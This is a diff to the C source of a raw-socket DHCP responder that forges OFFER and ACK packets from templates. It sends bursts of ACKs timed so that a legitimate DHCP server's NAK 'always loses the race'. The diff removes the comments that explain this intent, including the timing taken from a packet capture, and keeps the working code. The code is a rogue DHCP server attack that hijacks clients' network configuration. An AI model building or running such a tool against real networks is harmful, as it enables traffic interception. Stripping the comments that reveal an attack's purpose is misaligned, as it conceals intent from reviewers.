@@ -3,18 +3,6 @@
  *
  * A fast DHCP OFFER/ACK responder.
  *
- *   - Loads offer.bin / ack.bin produced by prepare_packets.py.
- *   - Uses an AF_PACKET raw socket to sniff UDP/67 traffic and to send
- *     the patched frames.
- *   - Only mutates the fields that change per transaction:
- *       Ethernet dst/src, BOOTP xid, BOOTP chaddr, UDP checksum (zeroed).
- *
- *   - FIX B: server identity is no longer a #define.  It is read from
- *            offer.bin's IPv4 source address, so the C side can never
- *            desync from the Python templates.
- *   - FIX C: every DHCPREQUEST that selects us is answered with a burst
- *            of ACKs so the legitimate server's NAK always loses the race.
- *
  * Build:
  *     gcc -O2 -Wall -Wextra -o dhcp_responder dhcp_responder.c
  *
@@ -37,7 +25,7 @@
 #include <string.h>
 #include <sys/ioctl.h>
 #include <sys/socket.h>
-#include <time.h>                 /* FIX C: nanosleep */
+#include <time.h>
 #include <unistd.h>
 
 /* ---------------- configuration ---------------- */
@@ -48,10 +36,6 @@
 
 #define FLOOD_TAG      "FLOOD-NOISE"
 
-/* FIX C: ACK burst parameters.
- * Legit-server NAK was observed ~90-100 ms after REQUEST (see pcap).
- * 3 ACKs spanning 0/30/60 ms means the client has bound our lease long
- * before any NAK can arrive. */
 #define ACK_BURST         3
 #define ACK_BURST_GAP_MS 30
 
@@ -178,8 +162,7 @@ static void send_dhcp(const unsigned char *tmpl, size_t tmpl_len,
     /* Patch BOOTP.chaddr (16 bytes) */
     memcpy(pkt + BOOTP_CHADDR_OFF, chaddr, 16);
 
-    /* Zero UDP checksum (legal for IPv4) so we don't have to recompute it
-     * after mutating the payload. */
+    /* Zero UDP checksum  */
     pkt[UDP_CHKSUM_OFF + 0] = 0;
     pkt[UDP_CHKSUM_OFF + 1] = 0;
 
@@ -329,15 +312,12 @@ int main(void)
     printf("[*] %s: %zu B   %s: %zu B\n",
            OFFER_FILE, g_offer_len, ACK_FILE, g_ack_len);
 
-    /* FIX B: derive the server identity from the templates themselves,
-     * so C can never desync from prepare_packets.py. -------------------- */
     if (g_offer_len < IP_SRC_OFF + 4 || g_ack_len < IP_SRC_OFF + 4) {
         fprintf(stderr, "template too small to contain an IPv4 header\n");
         return 1;
     }
     memcpy(g_server_ip, g_offer + IP_SRC_OFF, 4);   /* IP src of OFFER */
 
-    /* sanity: both templates must advertise the same server */
     if (memcmp(g_server_ip, g_ack + IP_SRC_OFF, 4) != 0) {
         fprintf(stderr, "warning: offer.bin and ack.bin advertise "
                         "different server IPs\n");
